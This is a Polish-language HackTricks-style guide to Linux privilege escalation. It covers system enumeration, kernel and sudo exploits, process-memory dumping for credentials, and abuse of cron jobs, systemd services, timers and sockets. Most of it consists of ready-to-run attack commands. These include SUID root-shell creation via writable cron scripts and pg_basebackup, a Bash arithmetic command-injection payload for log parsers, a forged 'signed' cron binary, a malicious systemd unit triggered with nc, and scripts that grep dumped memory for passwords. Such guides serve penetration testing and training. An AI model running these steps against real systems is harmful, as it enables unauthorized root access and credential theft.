# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy zdobywać wiedzę o uruchomionym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli masz uprawnienia do zapisu w dowolnym katalogu zawartym w zmiennej `PATH` możesz przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Env info

Interesujące informacje, passwords lub API keys w zmiennych środowiskowych?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje jakiś exploit, który można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder oraz kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, na których możesz znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom na maszynie ofiary — sprawdza tylko exploity dla kernel 2.x)

Zawsze **wyszukaj wersję kernel w Google** — być może Twoja wersja kernel jest wymieniona w jakimś kernel exploicie, co da Ci pewność, że exploit działa.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje Sudo przed 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym lokalnym użytkownikom na eskalację uprawnień do root za pomocą opcji sudo `--chroot`, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak tę vuln można wykorzystać.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Jeśli jesteś w containerze, zacznij od następującej sekcji container-security, a następnie przejdź do runtime-specific abuse pages:


{{#ref}}
container-security/
{{#endref}}

## Dyski

Sprawdź **what is mounted and unmounted**, gdzie i dlaczego. Jeśli cokolwiek jest unmounted możesz spróbować to zamontować i sprawdzić, czy nie zawiera poufnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **jest zainstalowany jakiś kompilator**. Jest to przydatne, jeśli będziesz używać jakiegoś kernel exploit, ponieważ zaleca się kompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieć jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do eskalacji uprawnień…\ 
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Zwróć uwagę, że te polecenia pokażą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Processes

Spójrz na **jakie procesy** są wykonywane i sprawdź, czy któryś proces ma **więcej uprawnień niż powinien** (może tomcat wykonywany jako root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** — można je wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je poprzez sprawdzenie parametru `--inspect` w linii poleceń procesu.\
Sprawdź też **swoje uprawnienia do binarek procesów**, może uda się nadpisać którąś z nich.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często albo gdy spełniony jest określony zestaw warunków.

### Pamięć procesu

Niektóre usługi serwera zapisują **dane uwierzytelniające w czystym tekście w pamięci**.\
Z reguły potrzebujesz **uprawnień roota** do odczytu pamięci procesów należących do innych użytkowników, dlatego jest to zwykle bardziej przydatne, gdy już jesteś root i chcesz odkryć więcej danych uwierzytelniających.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Zwróć uwagę, że obecnie większość maszyn **nie zezwala domyślnie na ptrace**, co oznacza, że nie możesz zrzucać innych procesów należących do Twojego nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: debugowany może być tylko proces macierzysty.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymagana jest capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu potrzebny jest reboot, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać w nim dane uwierzytelniające.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu, **maps pokazują, jak pamięć jest zmapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazują też **uprawnienia każdej zmapowanej sekcji**. Pseudoplik **mem** **udostępnia bezpośrednio pamięć procesu**. Z pliku **maps** dowiadujemy się, które **regiony pamięci są dostępne do odczytu** i jakie mają offsety. Wykorzystujemy te informacje, aby **ustawić pozycję w pliku mem i zrzucić wszystkie czytelne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie pamięci wirtualnej. Dostęp do wirtualnej przestrzeni adresowej jądra można uzyskać za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to reinterpretacja klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows, dostosowana do linux. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Do dumpowania pamięci procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i dumpować proces, którego jesteś właścicielem
- Script A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz zrzucić pamięć procesu (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby zrzucenia pamięci procesu) i wyszukać w pamięci poświadczenia:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) pozwala **steal clear text credentials from memory** oraz z niektórych **well known files**. Wymaga uprawnień root, aby działać poprawnie.

| Feature                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/Cron jobs

### Crontab UI (alseambusher) uruchomiony jako root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z interfejsem loopback, nadal możesz się do niego dostać przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie, aby eskalować uprawnienia.

Typowy przebieg
- Odnajdź port dostępny tylko z loopback (np. 127.0.0.1:8000) oraz Basic-Auth realm za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane uwierzytelniające w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- jednostka systemd zawierająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunel i logowanie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie o wysokich uprawnieniach i uruchom natychmiast (tworzy SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nie uruchamiaj Crontab UI jako root; ogranicz działania do dedykowanego użytkownika i minimalnych uprawnień
- Powiąż z localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj ponownie haseł
- Unikaj umieszczania sekretów w unit files; użyj secret stores lub EnvironmentFile dostępnego tylko dla root
- Włącz audit/logging dla on-demand job executions



Sprawdź, czy któryś scheduled job jest podatny. Być może możesz wykorzystać script uruchamiany przez root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, w pliku _/etc/crontab_ znajdziesz PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma prawa zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać powłokę roota, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany jako root zawiera “**\***” w poleceniu, możesz to wykorzystać do wywołania nieoczekiwanych skutków (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj poniższą stronę, aby poznać więcej wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter expansion i command substitution przed arithmetic evaluation w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje niezaufane pola logów i przekazuje je do arithmetic context, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron zostanie uruchomiony.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Umieść kontrolowany przez atakującego tekst w parsowanym logu tak, aby pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoje polecenie nie wypisuje na stdout (lub przekieruj je), aby arithmetic pozostało ważne.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root używa **directory, do którego masz pełny dostęp**, może być przydatne usunięcie tego folderu i **utworzenie symlink folderu wskazującego na inny**, który będzie serwował script kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Walidacja symlinków i bezpieczniejsze obsługiwanie plików

Przeglądając uprzywilejowane skrypty/binaria, które odczytują lub zapisują pliki po ścieżce, zweryfikuj, jak obsługiwane są linki:

- `stat()` podąża za symlinkiem i zwraca metadane celu.
- `lstat()` zwraca metadane samego linku.
- `readlink -f` i `namei -l` pomagają rozwiązać ostateczny cel i pokazują uprawnienia każdego składnika ścieżki.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Dla defenders/developers, bezpieczniejsze wzorce przeciw symlink tricks obejmują:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Możesz monitorować procesy, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i eskalować uprawnienia.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz także użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy proces, który się uruchamia).

### Kopie zapasowe wykonywane przez root, które zachowują ustawione przez atakującego bity trybu (pg_basebackup)

Jeśli cron uruchamiany przez root owija `pg_basebackup` (lub dowolne rekursywne kopiowanie) względem katalogu bazy danych, do którego możesz zapisywać, możesz umieścić **SUID/SGID binary**, który zostanie skopiowany ponownie jako **root:root** z tymi samymi bitami trybu do outputu kopii zapasowej.

Typowy przebieg odkrywania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby wykryć cron uruchamiany przez root wywołujący coś w rodzaju `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` co minutę.
- Potwierdź, że source cluster (np. `/var/lib/postgresql/14/main`) jest zapisywalny przez Ciebie, a destination (`/opt/backups/current`) staje się własnością root po wykonaniu zadania.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
To działa, ponieważ `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy jest uruchomione przez root, pliki docelowe dziedziczą **własność root + SUID/SGID wybrane przez atakującego**. Każda podobna uprzywilejowana rutyna backup/copy, która zachowuje uprawnienia i zapisuje do lokalizacji wykonywalnej, jest podatna.

### Niewidoczne zadania cron

Możliwe jest utworzenie zadania cron poprzez **wstawienie znaku powrotu karetki po komentarzu** (bez znaku nowej linii), i zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z możliwością zapisu

Sprawdź, czy możesz zapisać dowolny plik `.service`, jeśli tak, **możesz go zmodyfikować** tak, aby **uruchamiał** **twojego backdoor gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może będziesz musiał poczekać aż maszyna zostanie zrestartowana).\
Na przykład stwórz swój backdoor wewnątrz pliku .service z **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z możliwością zapisu

Pamiętaj, że jeśli masz **uprawnienia zapisu do binarnych plików wykonywanych przez usługi**, możesz je zmodyfikować na backdoors, tak że gdy usługi zostaną ponownie uruchomione, backdoors zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli okaże się, że możesz **write** w którymkolwiek z folderów ścieżki, możesz być w stanie **escalate privileges**. Musisz szukać **relative paths being used on service configurations** w plikach takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **executable** o **tej samej nazwie co relative path binary** w zapisywalnym katalogu systemd PATH, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor** zostanie wykonany (unprivileged users zazwyczaj nie mogą startować/stopować usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasowych kalendarza i zdarzeń monotonicznych oraz mogą być uruchamiane asynchronicznie.

Możesz wyświetlić wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on istniejące jednostki systemd.unit (np. `.service` lub `.target`)
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Therefore, to abuse this permission you would need to:

- Znajdź jakiś systemd unit (like a `.service`) który **wykonuje plik binarny, do którego masz prawa zapisu**
- Znajdź jakiś systemd unit który **wykonuje ścieżkę względną** i masz **uprawnienia zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Learn more about timers with `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tej samej lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Gniazda można konfigurować przy użyciu plików `.socket`.

**Dowiedz się więcej o socketach za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Opcje te różnią się, ale w skrócie służą do **określenia, gdzie będzie nasłuchiwać** socket (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, dla każdego przychodzącego połączenia jest tworzona **instancja usługi** i jedynie gniazdo połączenia jest jej przekazywane. Jeśli **false**, wszystkie nasłuchujące gniazda są **przekazywane do uruchomionej jednostki service**, i tworzona jest tylko jedna jednostka usługi dla wszystkich połączeń. Ta wartość jest ignorowana dla datagramów i FIFO, gdzie pojedyncza jednostka usługi bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisać nowe demony w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **socketów**/FIFO, odpowiednio. Pierwszym tokenem linii poleceń musi być ścieżka absolutna do pliku wykonywalnego, a następnie argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **socketów**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie odnosi się do usługi o tej samej nazwie co socket (z zastąpionym sufiksem). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapiswalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w rodzaju: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie wykonany przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na ponowne uruchomienie maszyny.**\
_Uwaga: system musi korzystać z tej konfiguracji pliku socket, w przeciwnym razie backdoor nie zostanie wykonany_

### Aktywacja socketów + zapisywalna ścieżka jednostek (utworzenie brakującej usługi)

- jednostka socket z `Accept=no` i `Service=<name>.service`
- odniesiona jednostka service nie istnieje
- atakujący może zapisać do `/etc/systemd/system` (lub innej ścieżki przeszukiwania jednostek)

W takim wypadku atakujący może utworzyć `<name>.service`, a następnie wygenerować ruch do socketu, tak aby systemd załadował i uruchomił nową usługę jako root.

Szybki przebieg:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Zapisowalne sockets

